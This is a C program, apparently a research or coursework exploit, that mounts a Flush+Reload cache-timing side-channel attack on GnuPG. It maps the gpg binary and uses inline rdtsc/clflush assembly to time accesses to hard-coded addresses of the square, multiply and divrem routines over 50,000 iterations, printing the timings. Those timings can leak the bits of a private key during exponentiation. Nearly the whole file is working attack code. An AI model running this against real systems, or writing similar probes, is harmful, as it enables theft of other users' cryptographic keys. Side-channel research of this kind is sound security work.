#include <sys/mman.h>
#include "stdio.h"
#include "stdlib.h"
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
unsigned int THRESHOLD = 265;

int probe(char* addr){
    volatile unsigned int time;
    // read timestamp
    // move timestamp to another reg
    //cpuid
    // mem access
    //cpuid
    // read timestamp
    //cflush

    asm __volatile__(
        "mfence\n\t"
        "rdtsc\n\t"
        "lfence\n\t"
        "movl %%eax, %%edi\n\t"
        "movl (%1), %%eax \n\t"
        "lfence\n\t"
        "rdtsc\n\t"
        "subl %%edi, %%eax\n\t"
        "clflush 0(%1)\n\t"
        :"=a"(time)
        :"c"(addr)
        :"edi","edx"

    );

    return time;
}
void busy_wait(){
    for(int i =0; i<1000; i++){
         asm __volatile__(
        "nop\n\t"
        );
    }

}

void nop(){
         asm __volatile__(
        "nop\n\t"
        "nop\n\t"
        "nop\n\t"
        "nop\n\t"
        "nop\n\t"
        "nop\n\t"
        "nop\n\t"
        "nop\n\t"
        "nop\n\t"
        "nop\n\t"
        );

}

u_int64_t time(){
  u_int64_t a,d;

   asm __volatile__(
        "mfence\n\t"
        "rdtsc\n\t"
        "mfence\n\t"

        :"=a"(a),"=d"(d)
        :
        :
    );

   return (d<<32) | a;
}
int main(void){
    int fp = open("/usr/local/bin/gpg", O_RDONLY);
    struct stat statbuf;
    if (fstat (fp,&statbuf) < 0){
        printf ("fstat error");
        return 0;
   }
   char*  file_addr = (char*) mmap(0, statbuf.st_size, PROT_READ, MAP_SHARED, fp, 0);
   if(file_addr < 0){
       printf("error");
    }
   int sqr_addr= 0x9f44c;
   int mul_addr = 0x9fd80;
   int divrem_addr = 0x9e57c;
   int other_mul = 0x9fa57;

/*
  u_int64_t first = time();
   int sqr = probe(file_addr + sqr_addr);
   int mul = probe(file_addr + mul_addr);
   int other_mul = probe(file_addr+ other_mul);
   int divrem = probe(file_addr + divrem_addr);
   u_int64_t second = time();
   u_int64_t diff = second -first;

   printf("first %lu\n",first);
   printf("second %lu\n",second);
   printf("cycles %lu\n",diff);
   
   // nops
   
   first = time();
   for(int i=0;i<100;i++){nop();}
   second = time();
   diff = second -first;
   printf("wait %lu\n",diff);
*/
   for(int i=0;i< 50000;i++){
       int sqr = probe(file_addr + sqr_addr);
       int mul = probe(file_addr + mul_addr);
       int other_mul = probe(file_addr+ other_mul);
       int divrem = probe(file_addr + divrem_addr);

       printf("%d,%d,%d,%d\n",sqr,mul,other_mul,divrem);
       // busy wait
       for(int i=0;i<50;i++){nop();}


   }
   
    return 0;
}

